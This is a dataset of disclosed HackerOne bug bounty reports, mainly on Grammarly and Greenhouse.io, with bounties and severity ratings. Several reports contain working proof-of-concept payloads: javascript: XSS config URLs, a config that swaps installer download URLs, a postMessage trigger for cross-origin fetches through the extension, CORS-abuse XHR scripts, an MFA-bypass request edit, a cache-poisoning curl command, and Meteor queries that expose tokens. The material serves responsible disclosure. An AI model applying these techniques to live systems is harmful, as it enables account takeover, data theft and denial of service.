And paying users will get the payload trigger when clicking ""Subscription"" in the menu:
Image F1165877: Screenshot_2021-01-21_at_01.28.19.png 87.16 KiBZoom in Zoom out Copy Download
Code 189 BytesWrap lines Copy Download1https://app.grammarly.com/docs/new?config={%22account%22:{%22subscription%22:%22javascript:alert(document.domain)//%22},%22api%22:{%22redirect%22:%22javascript:alert(document.domain)//%22}}
Since the config is persistent during the session, going to the main page as a free user and clicking the upgrade to premium will also get it triggered, but you can link to the start page also with the config (this won't hide the payload however):
Code 104 BytesWrap lines Copy Download1https://app.grammarly.com/?config={%22api%22:{%22redirect%22:%22javascript:alert(document.domain)//%22}}
Image F1165878: Screenshot_2021-01-21_at_01.05.36.png 243.12 KiBZoom in Zoom out Copy Download
You can also modify the crossPlatformOfficeAddin.infoURL since it's also not a part of the schema:
Code 124 BytesWrap lines Copy Download1https://app.grammarly.com/?config={%22crossPlatformOfficeAddin%22:{%22infoURL%22:%22javascript:alert(document.domain)//%22}}
Image F1165879: Screenshot_2021-01-21_at_01.47.50.png 180.63 KiBZoom in Zoom out Copy Download
Here's a video showing both scenarios for free and premium:
Video F1165872: grammarly-xss.mp4 8.42 MiBZoom in Zoom out Copy Download
Mitigation
I would first suggest to remove the config-parameter feature completely. The risk of adding new properties when using a partial TypeScript schema will just introduce this issue again if the schema is not updated. Another solution would be to change the properties in the schema which are critical into being non-partial, which means it can only contain the parts specified in the TypeScript-schema.
Impact
The XSS-issue affects all browsers and is not mitigated by any CSP, since you allow unsafe-inline and unsafe-eval. Any calls can be made as the attacker, since the javascript runs on the proper origin as the code already interacting with your APIs. However, there are more parameters in the config to modify that might change other things as well, not just creating an XSS. For example, desktop.windows.installURL and desktop.mac.installURL would be very interesting to also modify into proper URLs without any XSS needed, since you would then modify the APP-download for the installation files for the affected user, no XSS needed:
Code 301 BytesWrap lines Copy Download1https://app.grammarly.com/?config={%22crossPlatformOfficeAddin%22:{%22infoURL%22:%22https://example.com%22},%22officeAddin%22:{%22installURL%22:%22https://example.com%22},%22desktop%22:{%22windows%22:{%22installURL%22:%22https://example.com%22},%22mac%22:{%22installURL%22:%22https://example.com%22}}}
Regards,
Frans7 attachments:F1165872: grammarly-xss.mp4F1165873: Screenshot_2021-01-21_at_01.29.18.pngF1165874: Screenshot_2021-01-21_at_01.28.28.pngF1165875: Screenshot_2021-01-21_at_01.32.01.pngF1165877: Screenshot_2021-01-21_at_01.28.19.pngF1165878: Screenshot_2021-01-21_at_01.05.36.pngF1165879: Screenshot_2021-01-21_at_01.47.50.pngdwan   updated the severity to medium (6.4). Jan 21st (2 years ago)dwan   changed the status to Triaged. Jan 21st (2 years ago)Hello @fransrosen,
Thank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.
Regards,
@dwangr_triage Grammarly staff  posted a comment. Jan 21st (2 years ago)Hey @fransrosen!
Thanks for the report, we're investigating this.Grammarly  rewarded fransrosen with a $3,000 bounty. Jan 21st (2 years ago)Thanks for the report, @fransrosen!
We're working on the fix for this issue.gr_triage Grammarly staff  closed the report and changed the status to Resolved. Feb 9th (2 years ago)Hey @fransrosen!
According to my notes, this bug should be resolved now.
We removed config sourcing from URL query parameters.

Also, our team decided to award you a Grammarly Premium subscription for this well-written report!
Please write an email to application-security@grammarly.com from the email address associated with your Grammarly account.
Thanks again for your contribution!gr_triage Grammarly staff  requested to disclose this report. Mar 1st (2 years ago)fransrosen   agreed to disclose this report. Mar 1st (2 years ago)  This report has been disclosed. Mar 1st (2 years ago)",https://hackerone.com/reports/1082847,California,United States,San Francisco,2021,1,21,0,56
Grammarly,501-1000,0.0,10m-50m,"$5,000.00",High,7.95,Information Disclosure,Employee's GitHub Token Found In Travis CI Build Logs,"karimpwnz  submitted a report to Grammarly.Feb 16th (4 years ago)Summary by karimpwnzWe would like to thank Grammarly for their cooperation and generous bounty.
This report was a part of our research on Travis CI's attack surface: https://edoverflow.com/2019/ci-knew-there-would-be-bugs-here/",https://hackerone.com/reports/496937,California,United States,San Francisco,2019,2,16,2,5
Grammarly,501-1000,0.0,10m-50m,"$2,000.00",Medium,6.5,Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG),"Grammarly Keyboard for Android ""Authorization Code with PKCE"" flow implementation vulnerability that allows account takeover",tomtenisse  submitted a report to Grammarly.Mar 19th (3 years ago),https://hackerone.com/reports/824931,California,United States,San Francisco,2020,3,19,22,10
Grammarly,501-1000,0.0,10m-50m,$300.00,Low,2.0,Information Exposure Through Debug Information,Grammarly Keyboard for Android <4.1  leaks user input through logs (except for sensitive input fields),homelander  submitted a report to Grammarly.Dec 14th (4 years ago),https://hackerone.com/reports/462416,California,United States,San Francisco,2018,12,14,11,42
Grammarly,501-1000,0.0,10m-50m,"$3,000.00",Critical,9.5,None,Handling of `tracking` command allows making arbitrary blind requests with user's cookies from Grammarly Extension's origin,"metnew  submitted a report to Grammarly.Aug 1st (4 years ago)Summary:
Attacker could trigger Grammarly extension's gnar._fetch command using a crafted page to perform XHR with cookies and any configurational params to any cross-origin resource.
Description:
Page could Init Grammarly popup editor [no user gesture, helper]
Events have isTrusted property, which allows to determinate, whether current event is trusted(initiated by user). Grammarly popup editor could be initiated by page.
As I understood: injected content script could successfully emit events to background page only if popup was initiated earlier.
That means, attacker needs to initiate the popup somehow to communicate with background page through injected content script.
Not sure about the root cause of this behavior. Probably, because popup is created by background page origin, that's why background page becomes accessible after this.
Sending commands to Grammarly content script
Active page could send commands to injected Grammarly content script using window.postMessage.
Command structure:
Code 129 BytesWrap lines Copy Download1window.postMessage({
2    grammarly: true,
3    action: 'tracking',
4    method: 'gnar._fetch',
5    props: {}
6    params: {}
7}, ""*"")
Commands handling in injected content script
Grammarly content script ""parses"" commands using this snippet:
Code 130 BytesWrap lines Copy Download1function Z(e) {
2    var t, n = e.action;
3    ... 
4    ""tracking"" === n && e.method && g.call(e.method, e.param, e.props)
5    ...
6}
tracking commands are later passed to this snippet:
Code 133 BytesWrap lines Copy Download1f.emitBackground(""tracking-call"", {
2    msg: e, // command's ""method"" field
3    data: t // command's ""props"" + ""params"" fields
4 }, s)
This f.emitBackground sends event to background page.
Commands handling in extension's background page
The extension uses next snippet to handle tracking commands from content script:
Code 865 BytesWrap lines Copy Download1function w(e, t) { // t = params + props
2    var n, a = o(e.split("".""), 2), // a = command's ""method"" field splitted by dot into array
3        c = a[0],
4        s = a[1];
5    if (""gnar"" === c) 
6        if (p.tracker.gnar)
7            if (""track"" === s) {
8                var u = o(t, 2),
9                    l = u[0], // 
10                    f = u[1];
11                p.tracker.gnar.track(r({
12                    eventName: g.gnarAppName + ""/"" + l // something not discovered yet 
13                }, f))
14            } else
15                p.tracker.gnar[s] ? (n = p.tracker.gnar)[s].apply(n, i(t)) : b.error(
16                    ""gnar client does not have method '"" + s + ""' for '"" +
17                    e + ""' in runMessage"");
18    else b.error(""gnar client not available for '"" + e + ""' in runMessage"");
19    else b.error(""unrecognized'"" + e + ""' in runMessage "")
20}
p.tracker.gnar
That's an object with next structure:
Code 647 BytesWrap lines Copy Download1{
2    _batchId: 8,
3    _client: ""chromeExt"",
4    _clientVersion: ""14.858.1756"",
5    _containerIdManager: t {primaryStorage: t, secondaryStorages: Array(3), _logger: t, _metric: e,  _cacheSuccessTimeoutMillis: 1000, …},
6    _eventsUrl: ""https://gnar.grammarly.com/events"",
7    _fetch: ƒ (),
8    _instanceId: ""nxIwqgPE"",
9    _isTest: false,
10    _isUserReady: true,
11    _liteUrl: ""https://gnar.grammarly.com/lite"",
12    _logger: t {name: ""gnar"", level: 2, context: e, appender: ƒ},
13    _metric: t {name: ""gnar"", timersSink: ƒ, countersSink: ƒ, _fetch: ƒ, _sendTimeout: 7500, …},
14    _queue: [],
15    _storePingTimestamp: true,
16    _userId: ""701014151
17}
Additionally, it has a set of methods.

I guess p.tracker.gnar controls reporting telemetry events to Grammarly.

Attacker-controllable function call
Code 58 BytesWrap lines Copy Download1p.tracker.gnar[s] ? (n = p.tracker.gnar)[s].apply(n, i(t))
s = that's the second part of command's ""method"" field. E.g. ""method"": ""hello.grammarly"" -> s = 'grammarly'
t = params and props
This snippet could be rewritten as:
Code 57 BytesWrap lines Copy Download1GNAR[methodsMethod].apply(GNAR,  toArray(paramsAndProps))
p.tracker.gnars .constructor and methods
p.tracker.gnar object could be overwritten using .constructor  and .setUser methods those allow changing some p.tracker.gnar properties. 
p.tracker.gnars .constructor
Code 659 BytesWrap lines Copy Download1function e(e, t, n, r, o, i, c, s) { // Attacker controls e and t params + non-listed params using `setUser`
2            void 0 === s && (s = !1),
3            this._client = t,
4            this._clientVersion = n,
5            this._fetch = r,
6            this._containerIdManager = o,
7            this._logger = i,
8            this._metric = c,
9            this._storePingTimestamp = s,
10            this._instanceId = a.alphanumeric(8),
11            this._batchId = 0,
12            this._isUserReady = !1,
13            this._queue = [],
14            this._eventsUrl = e + ""/events"",
15            this._liteUrl = e + ""/lite"",
16            this._pingMaybe()
17        }
gnar.setUser/gnar._execQueue / gnar._send / gnar._doSend / gnar._enqueue
p.tracker.gnar has a set of interesting methods like setUser. Grammarly extension uses setUser to invalidate session. 
Code 115 BytesWrap lines Copy Download1a[""session-invalidate""] = function (e, t, n, r, o) {
2        ...
3        s.call(""gnar.setUser"", i, c)
4        ...
5}

I'm not sure, but looks like calling this method with crafted payload may lead to incorrect userId in telemetry. 

Team probably should know how much powerful listed above funcstions are. 
_fetch
p.tracker.gnar has _fetch property which points to fetch function.
More interesting is that, it's a polyfill, not a native function.

I guess this polyfill isn't compliable to WHATWG fetch, because it allows making requests to data:/chrome-extension:/ origins.

That means, it's possible to call fetch() with attacker's params from the extension.
Code 71 BytesWrap lines Copy Download1p.tracker.gnar_fetch.apply(p.tracker.gnar, [""FetchURL"", ""FetchParams""])
Page has to call window.postMessage with next object to call fetch from the extension
Code 309 BytesWrap lines Copy Download1x = window.top.postMessage({
2    grammarly: true,
3    action: 'tracking',
4    method: 'gnar._fetch',
5    props: { // FetchParams
6        method: 'GET',
7        headers: {
8            'Content-Type': 'application/json'
9        }
10    },
11    param: 'https://mail.google.com/mail/u/0/#inbox' // <FetchURL>
12}, ""*"")
XHR + cookies
Grammarly extension has permissions to access all URLs and cookies from all origins.
Grammarly makes all XHR requests with cookies -> it's possible for attacker to make blind requests with cookies to any origin.

(except chrome://, however, chrome-extension:// is allowed because of polyfill for fetch).


More details in ""Impact"" section.

Browsers Verified In:
Chrome 70.0.3508.0 Canary
Chrome 68.0.3440.75 Stable
Grammarly: 14.858.1756
Steps To Reproduce:
Change user's name in Grammarly

Open app-grammarly-csfr.html
Page makes request to https://auth.grammarly.com/v3/user to change your name to ""Anonymous User"" 

GET Gmail as proof

Open Grammarly extension debug page in Chrome
Open get-request-to-gmail.html
Open ""Network"" tab in the debug page
Note that extension made a GET request to Gmail (with cookies)
Open request preview
Note that request includes your gmail content
That means, it's possible to initiate requests with cookies to any origin. Web applications without ""direct CSRF protection"" (e.g. hidden field with some value, not token in cookies ) are controllable by attacker.

Supporting Material/References:

Screencast for POST tohttps://auth.grammarly.com/v3/user. [1st PoC]
Screencast to prove that Grammarly makes requests with cookies to cross-origin domains. [2nd PoC] 


I didn't know a good CSRF target, so I've recorded a second screencast with Gmail and GET request. I think that's enough to prove the vulnerability.

Impact
Universal CSRF

Actually, ""Universal CSRF"" isn't a correct definition 😉. But I think it correctly expresses impact of the vulnerability.

Attacker could trigger Grammarly extension's gnar._fetch command  using crafted page to perform XHR with any configurational params to any origin [without user gesture]. 
Web applications without good protection against CSRF (hidden field in form, not cookies/origin check/etc.) are vulnerable to CSRF. 
Page could made any number of blind requests through Grammarly extension with cookies. 
Overwrite p.tracker.gnar and call any method of this object
p.tracker.gnar has a set of interesting methods like setUser. Grammarly extension uses setUser to invalidate session.

I assume, calling this methods leads to sending invalid telemetry data to Grammarly.

Possible UXSS via data manipulation
Attacker could overwrite p.tracker.gnar with arbitrary data. However, postMessage doesn't allow to send non-clonable objects.
Attacker could call something like:
Code 50 BytesWrap lines Copy Download1AnythingClonable.apply(Object, [AnythingClonable])

I didn't test this with File/Blob/FileList non-clonnable objects. However, I think it's not possible to turn the snippet above into XSS.


P.S: Grammarly, sorry for typos/mistakes if any. Your extension has some bugs at hackerone.com domain.
4 attachments:F327032: grammarly-ucsrf-username.mp4F327034: grammarly-gmail-get-as-proof.mp4F327036: app-grammarly-csfr.htmlF327037: get-request-to-gmail.html",https://hackerone.com/reports/389108,California,United States,San Francisco,2018,8,1,1,12
Grammarly,501-1000,0.0,10m-50m,$500.00,Medium,5.45,Improper Access Control - Generic,Permissive CORS policy trusting arbitrary extensions origin,foobar7  submitted a report to Grammarly.Sep 21st (4 years ago),https://hackerone.com/reports/412490,California,United States,San Francisco,2018,9,21,15,53
Grammarly,501-1000,0.0,10m-50m,"$2,500.00",Medium,5.45,Improper Access Control - Generic,Previously created sessions continue being valid after MFA activation,"brdoors3  submitted a report to Grammarly.Aug 5th (3 years ago)Hi team,
I found one issue related to your 2FA system on https://account.grammarly.com/security
POC
1 access the same account on https://account.grammarly.com in two devices
2 on device 'A' go to https://account.grammarly.com/security > complete all steps to activate the 2FA system
Now the 2FA is activated for this account
3 back to device 'B' reload the page
The session still active
Impact
In this scenario when 2FA is activated the other sessions of the account are not invalidated.
2FA is required to login. I believe the expected and recommended behavior here is to terminate the other sessions> request a new login> request the 2FA code> so then give the account access again",https://hackerone.com/reports/667739,California,United States,San Francisco,2019,8,5,15,49
Grammarly,501-1000,0.0,10m-50m,"$1,000.00",Low,3.9,Improper Access Control - Generic,Unauthenticated users can access all food.grammarly.io user's data,"cript0nauta  submitted a report to Grammarly.Nov 24th (3 years ago)Summary: The food.grammarly.io site uses the Meteor framework, which uses publications and methods to communicate between the backend and frontend. Although the site seems to require being authenticated as a Grammarly employee to use it, most methods and publications work without being authenticated. I was able to list user data including emails, access tokens and admin status just by using the Chrome Developer tools.
Description: I discovered that the following Meteor publications work without being authenticated:

activeUsers
allExtraFood
allOrders(date)
allUsers
allUserStats
allVendors
allVendorsItems
extraFoodFromToday
foodEventLog
foodSettings
itemsLimits
monthlyTop
vendorByName
vendorHistoryFromToday
vendorItemsByName
vendorsHistory

This means I can access the data stored in the following Meteor collections:

Meteor.users
ExtraFood
OrderItems
UserStats
Vendors
VendorsItems,
FoodEventLog
FoodSettings
VendorsItemsLimits
MontlyTopItems
VendorsHistory

The Meteor.users collection includes the email address of 300+ employees of Grammarly, along with their Okta and Google oauth access tokens, a hash of their login tokens, and their admin status. The FoodSettings collection also exposes some Grammarly user emails.
Based on the source code of the app, it seems that most Meteor methods also don't perform any authentication checks. But because they could perform destruction of data, I preferred not no use them when testing.
Browsers Verified In:

Chrome
Firefox

Steps To Reproduce:
(Add details for how we can reproduce the issue)

Visit https://food.grammarly.io and open the Chrome Developer Tools
In the console, run Meteor.subscribe('activeUsers')
Wait a few seconds, and run Meteor.users.find().forEach(e => console.log(e))
You will see all user's information, as seen in the screenshots

Supporting Material/References:

The Meteor Security page explains how this vulnerabilities can be fixed by implementing proper access control in the Meteor methods and publications

Impact
An attacker could use this vulnerability to get information about Grammarly employees. He/she could know which employees have admin privileges and target them in other attacks.
I wasn't able to use the Okta and Google tokens for anything of high impact. Also, the hashedLoginToken requires the attacker to reverse a SHA256 hash of a random secret, so exploiting it seems difficult.2 attachments:F642832: userlist.pngF642833: userdetail.png",https://hackerone.com/reports/745495,California,United States,San Francisco,2019,11,24,23,15
Grammarly,501-1000,0.0,10m-50m,"$2,500.00",Medium,5.45,Improper Authentication - Generic,“email” MFA mode allows bypassing MFA from victim’s device when the device trust is not expired,"l1nkworld  submitted a report to Grammarly.Aug 2nd (3 years ago)Summary:
It is possible bypass MFA without the need to have the phone code.
Description:
When we turn on the MFA and we have the user and password of the user, it is possible bypass the MFA only changing some values the endpoint POST auth.grammarly.com//v3/api/login
Steps To Reproduce:
Note: 


Use burp suite or another tool to intercept the requests

Turn on and configure your MFA
Login with your email and password
The page of MFA is going to appear
Enter any random number
when you press the button ""sign in securely"" intercept the request POST auth.grammarly.com/v3/api/login and in the POST message change the fields:



""mode"":""sms"" by ""mode"":""email""


""secureLogin"":true by ""secureLogin"":false



send the modification and check, you are in your account! It was not necessary to enter the phone code.

Impact
The attacker can bypass the experimental MFA, If the attacker has the email and password, the attacker can login in the account without the need of the phone code.",https://hackerone.com/reports/665722,California,United States,San Francisco,2019,8,2,2,55
Grammarly,501-1000,0.0,10m-50m,$750.00,Medium,4.2,Information Disclosure,Lack of CSRF header validation at https://g-mail.grammarly.com/profile,"orlserg  submitted a report to Grammarly.Jun 26th (3 years ago)Hello!
Description
I found that setting up a CORS in some places will check the protocol, but it allows using http scheme. In addition, any subdomain is considered trusted. If the origin is http://www.grammarly.com, then the server will respond: Access-Control-Allow-Origin: http://www.grammarly.com. That can lead to leakage of user data and unauthorized actions on behalf of the user.
Image F517015: burp.png 60.09 KiBZoom in Zoom out Copy Download
In fact, this means that an attacker can use the MITM attack (Wi-Fi, local networks, etc.) to substitute client requests, thus replacing the origin. 
Important note: I very carefully read the program policy and focus on the fact that MITM attack is not made on the existent grammarly sites.
How it works
Image F517002: CORS.png 142.58 KiBZoom in Zoom out Copy Download
If an attacker can perform a mitm attack on a user, he can replace the requested content of any unencrypted request and produce a 302 redirect of the user to http: //evil.grammarly.com. Since the request is not unencrypted, the attacker can also replace the response and implement javascript that performs a requests to vulnerable endpoints. Thus, the vulnerable enpoint will think that the request came from the origin of the trust it trusts and will execute the request.
Using a header to send a CSRF token protects against such attacks. But I found a place where verification of the transferred token is not performed.
This vulnerability was perfectly described by James Kettle on OWASP AppSec EU 2017. You can watch the description of the vulnerability on the link to his presentation. https://youtu.be/wgkj4ZgxI4c?t=1139
Vulnerable enpoints
1) The malicious javascript will look like:
Code 322 BytesWrap lines Copy Download1var xhttp = new XMLHttpRequest();
2xhttp.onreadystatechange = function() {
3   if (this.readyState == 4 && this.status == 200) {
4       document.getElementById(""response-node"").innerHTML = this.responseText;
5   }
6};
7xhttp.open(""GET"", ""https://g-mail.grammarly.com/profile"", true);
8xhttp.withCredentials = true;
9xhttp.send();
The response will contain the user's email address and subscription settings:
Code 826 BytesWrap lines Copy Download1{""id"":749327815,""email"":""email@yandex.ru"",""preferenceFields"":[{""name"":""Weekly Progress Reports"",""description"":""Get a weekly report with statistics and insights on how you are writing with Grammarly."",""order"":49,""value"":true},{""name"":""Product Updates"",""description"":""Important info on new features and products. We may also ask for your feedback on occasion."",""order"":50,""value"":true},{""name"":""Grammarly Offers"",""description"":""These emails may include special upgrade offers, limited-time events, or coupons. "",""order"":50,""value"":true},{""name"":""The Grammarly Blog"",""description"":""A weekly newsletter that includes fun tips on all things writing."",""order"":50,""value"":true},{""name"":""Grammarly Business"",""description"":""Updates and information on our products for multi-person teams."",""order"":55,""value"":true}],""unsubscribe"":false}
2) The malicious javascript will look like:
Code 251 BytesWrap lines Copy Download1var xhttp = new XMLHttpRequest();
2var data = new FormData();
3data.append(""email"", ""████████"");
4data.append(""unsubscribe"", ""false"");
5(...)
6xhttp.open(""POST"", ""https://g-mail.grammarly.com/profile"", true);
7xhttp.withCredentials = true;
8xhttp.send(data);
The request will change the subscription settings. It looks like CSRF.
Now I'm trying to find more places to increase the impact.
Impact
CORS misconfiguration lead to leakage of user data and unauthorized actions on behalf of the user.2 attachments:F517002: CORS.pngF517015: burp.png",https://hackerone.com/reports/629892,California,United States,San Francisco,2019,6,26,8,34
Gratipay,1-10,0.0,No value,$5.00,Medium,5.45,Cross-site Scripting (XSS) - Generic,"Self XSS Protection not used , I can trick users to insert JavaScript","ashesh  submitted a report to Gratipay.Jul 17th (7 years ago)Self XSS Protection not used , I can trick users to insert JavaScript
I see that you have not enabled ""Self XSS Protection not used"" on gratipay.com This technique prevents user from getting tricked into injecting js themselves
For example, Facebook have : http://gyazo.com/3b448c200124053b60b622d0149e242d
But you don't have it, You should Have it to protect users , it tells users not to get tricked and be safe. Its a best practise every website should follow for a safer web!
This bug has been fixed by many websites including Facebook. So its strongly advised you to fix it.
One of my Reports: http://i.imgur.com/XugsNyz.jpg
DATE: 16/06/2015
HOUR: 07:13:28 am
IP: 127.6.47.129",https://hackerone.com/reports/76307,No value,No value,No value,2015,7,17,19,28
Greenhouse.io,11-50,0.0,50m-100m,$100.00,Medium,5.45,Denial of Service,Bypass of request line length limit to DoS via cache poisoning,"irvinlim  submitted a report to Greenhouse.io.May 12th (5 years ago)Summary
This is a bypass of the fix that was introduced in response to report #334709. The bug in question was that it was possible to poison the cache of the generated JS file at https://boards.greenhouse.io/embed/job_board/js?for=surveymonkey, by appending a URL-encoded NULL byte (%00), followed by an arbitrary string of characters. I found in that report that it was possible to cause a denial of service by making the resultant applicationURI and boardURI parameters too long such that the server rejects any request, causing a ERR_CONNECTION_CLOSED error. As clarified with @rongutierrez, the temporary fix implemented in #334709 was to limit the length of the request URI, which was sufficient to prevent the DoS in my PoC in that report.
However, even though I found that the length restriction was 1024 bytes, I managed to bypass this length restriction by using multi-byte UTF-8 characters, which get expanded into up to 12 URL-encoded bytes, which results in me being able to poison the cache once again, making the resultant applicationURI parameter greater than the limit allowed by the server, resulting in a DoS once again.
Description
I found that the request URI was restricted to 1024 characters AFTER decoding, which was evident from trial and error. This meant that %00 was treated as 1 character, even though the input was 3 bytes long. Since the number of characters is limited to 1024, we have the following:

24 characters for the path segment, including the query string: /embed/job_board/js?for=
1 character for the NULL byte %00 after decoding
Variable length in bytes for the board token, minimum 1 byte
998 characters remaining for our payload

The length for the resultant URI (in bytes) we had to hit to cause a DoS, was at least 6169 bytes (approximately) as established in the previous report. This consists of:

49 bytes for the URI prefix, including the hostname: https://boards.greenhouse.io/embed/job_board?for=
3 bytes for the NULL byte %00 after encoding
Variable length in bytes for the board token, minimum 1 byte
6116 bytes remaining that will arise from our payload

Meanwhile, I had a theory that UTF-8 characters would be treated as a single character as well. This meant that for a single character like ""♥"", this is a 3-byte UTF-8 character, that gets URL encoded into %E2%99%A5, which is 9 bytes long. We can even use a 4-byte UTF-8 character which would give us 12 URL encoded bytes. This means that, even though we only have 998 characters, we can amplify this by up to a factor of 12x.
True enough by sending a request, using ""♥"" as our repeated payload 992 times, we can poison the cache with an amplified result as follows:
Code 152 BytesWrap lines Copy Download1#!/bin/sh
2
3REPEAT=992
4ID=623145
5curl --http1.1 -s ""https://boards.greenhouse.io/embed/job_board/js?for=a%00`python -c 'print(\""♥\"" * '$REPEAT')'`$ID"" -v
This produces the following URI for the boardURI parameter:
Code 8.78 KiBWrap lines Copy Download1https://boards.greenhouse.io/embed/job_board?for=a
This is 8987 characters in the URI prefix alone, which is beyond the 6169 bytes limit that causes the ERR_CONNECTION_CLOSED error in the previous report. This results in a similar DoS which is not mitigated.
The execution log can be found in execution-log.txt (F296561).
Recommended Fix
We can see that the previously implemented fix to limit the length of the request URI string to 1024 characters was insufficient, since we only need 510 times 12 bytes of URL encoded 4-byte UTF-8 characters to cause a DoS, assuming that the board token is a single byte (a).
As mentioned in the previous report #334709, it is much, much more foolproof to perform a whitelisting of the board token in the URL.
Alternatively, since it seems that this endpoint requires fetching of data from the database based on the board token that was extracted from the query string parameter, instead of reflecting the for parameter into the boardURI/applicationURI parameter in the JS file, why not take the value from the database instead, since it's guaranteed that it will not be unsafe?
Alternatively, you can choose to limit the request length further to a smaller size (maybe less than 500), but if your application server is able to maybe read UTF-16 or UTF-32 this would come to the same result once again, though I don't think that it's really possible.
The recommended fix is really to not reflect the untrusted user's input which would be reflected onto the cache-poisoned file, regardless if you validate the input query string parameter, or to just take the board token URI from the database and not the request URI. This would really ensure that the fix would be foolproof.
Impact
As reiterated in the previous reports, an attacker could attempt to poison the cache reliably, resulting in an extended denial of service of Greenhouse job boards/application iframes in client sites.1 attachment:F296561: execution-log.txt",https://hackerone.com/reports/350847,New York,United States,New York,2018,5,12,11,16
Greenhouse.io,11-50,0.0,50m-100m,$500.00,Medium,5.8,Improper Null Termination,Cache poisoning using NULL bytes and long URLs,"irvinlim  submitted a report to Greenhouse.io.Apr 8th (5 years ago)This is related to a previous report I made (https://hackerone.com/reports/326639). The same endpoint (https://boards.greenhouse.io/embed/job_board/js?for=) is still vulnerable to arbitrary string injection, by terminating the customer key in the for parameter with a URL-encoded NULL byte (i.e. %00), followed by an arbitrary string of text.
Although this may seem trivial since strings are URL escaped anyway (see the previous report), I realised that we can inject an extremely large number of arbitrary characters after the NULL byte, which will be propagated to the boardURI and applicationURI values in the Grnhse.Settings object, as follows:
Code 12.23 KiBWrap lines Copy Download1Grnhse.Settings = {
2  targetDomain:   'https://boards.greenhouse.io',
3  scrollOnLoad:   true,
4  autoLoad:       true,
5  boardURI:       'https://boards.greenhouse.io/embed/job_board?for=surveymonkey
6  applicationURI: 'https://boards.greenhouse.io/embed/job_app?for=surveymonkey
7  baseURI:        '',
8  iFrameWidth:    650
9};
This generated JS file is cached on the Greenhouse CDN/servers for an undetermined amount of time, which allows the same poisoned JS file to be loaded from the original URL at https://boards.greenhouse.io/embed/job_board/js?for=surveymonkey. This means that when a job application page is requested using applicationURI as the prefix, the extremely long URL will be prefixed onto the actual iframe URL.
We can see that the value of the applicationURI URL prefix is 6155 bytes long, which is close to the maximum number of bytes in the URL I was able to send to the board.greenhouse.io server, before receiving ERR_CONNECTION_CLOSED. Since the applicationURI usually takes the form https://boards.greenhouse.io/embed/job_app?for=surveymonkey&token=XXXXXXX, where the token parameter is around 6-7 bytes long, these extra bytes for the token parameter are just enough so that the URL is now around 6169 bytes, enough to cause a ERR_CONNECTION_CLOSED error from the web server when the user opens the job application page with an iframe, resulting in a denial of service preventing him/her from loading the job application URL.
As an example, try to visit the following URL, where I added &token=1234567 onto the applicationURI above:
Code 6.02 KiBWrap lines Copy Download1https://boards.greenhouse.io/embed/job_app?for=surveymonkeytoken=1234567
I have omitted the proof of concept that this exploit bricks a live job board from start to finish, since it has already been proven in the previous report that we can cause a denial of service by changing the applicationURI in the JS file. If necessary, I will try to reproduce it on an actual job board, but I do not own a Greenhouse account to test it on.
However, I have attached a proof of concept for cache poisoning the JS file, which shows that the NULL bytes and the arbitrary strings are able to be injected into the applicationURI value.
Proof of Concept
Visit https://boards.greenhouse.io/embed/job_board/js?for=surveymonkey, whose cache is still poisoned at the moment.
Root Cause
The for parameter value is being copied verbatim into the resultant URL in the JS file.
Impact
If an attacker has knowledge about the underlying cache and network architecture, the attacker could attempt to poison the cache reliably, resulting in an extended denial of service of Greenhouse job boards/application iframes in client sites.1 attachment:F283193: null-byte-injection-command.txt",https://hackerone.com/reports/334709,New York,United States,New York,2018,4,8,16,15
Greenhouse.io,11-50,0.0,50m-100m,$100.00,Medium,5.3,Information Exposure Through Debug Information,Debug information disclosure on oauth-redirector.services.greenhouse.io,"ajxchapman  submitted a report to Greenhouse.io.Feb 12th (5 years ago)Summary:
The configuration of the Sintra framework application hosted at oauth-redirector.services.greenhouse.io exposes internal information when exceptions occur. The application is configured with the show_exceptions setting which causes internal application configuration, environment variables and source code snippets to be exposed when exceptions occur.
Description:
When an unhandled exception occurs (such as providing an invalid oauth_redirect_uri cookie value to /integrations/oauth/create) the application produces a nicely formatted error page which lists internal application data such as configuration, environment variables and source code snippets.
This issue was identified whilst assessing the security of the OAuth login function at https://app.greenhouse.io/users/sign_in
Steps To Reproduce:

Send the following HTTP request to https://oauth-redirector.services.greenhouse.io/integrations/oauth/create?state=x&code=x:

Code 453 BytesWrap lines Copy Download1GET /integrations/oauth/create?state=x&code=x HTTP/1.1
2Host: oauth-redirector.services.greenhouse.io
3User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:58.0) Gecko/20100101 Firefox/58.0
4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate
7Cookie: oauth_redirect_uri=https%3A%2F%2Fapp.<x>greenhouse.io%2Fusers%2Fauth%2Fgoogle_oauth2%2Fcallback
8Connection: close
9
Supporting Material/References:
See the attached screenshot and saved HTML of an application error.
Impact
Information provided by this exception, or other exceptions exposed by the Sintra framework due to the show_exceptions configuration setting, could allow an attacker to obtain sensitive internal configuration or source code snippets.2 attachments:F262638: greenhouse.io.htmlF262639: Screen_Shot_2018-02-12_at_14.08.09.png",https://hackerone.com/reports/315205,New York,United States,New York,2018,2,12,14,25
Greenhouse.io,11-50,0.0,50m-100m,$500.00,Medium,5.8,Denial of Service,DoS through cache poisoning using invalid HTTP parameters,"irvinlim  submitted a report to Greenhouse.io.Mar 16th (5 years ago)I was taking a look into a related report (https://hackerone.com/reports/298265) and I discovered that the https://boards.greenhouse.io/embed/job_board/js?for= endpoint doesn't throw errors when I try to pass in an array of for parameters like this:
Code 187 BytesWrap lines Copy Download1https://boards.greenhouse.io/embed/job_board/js?for[]=twitter&for[]=&for[]=&for[]=&for[]=&for[]=&for[]=&for[]=&for[]=&for[]=&for[]=&for[]=&for[]=&for[]=&for[]=&for[]=&for[]=&for[]=&for[]=
Instead, in the resultant JS, we can see that the HTTP parameters are escaped and injected into the Grnhse.Settings object:
Code 870 BytesWrap lines Copy Download1Grnhse.Settings = {
2  targetDomain:   'https://boards.greenhouse.io',
3  scrollOnLoad:   true,
4  autoLoad:       true,
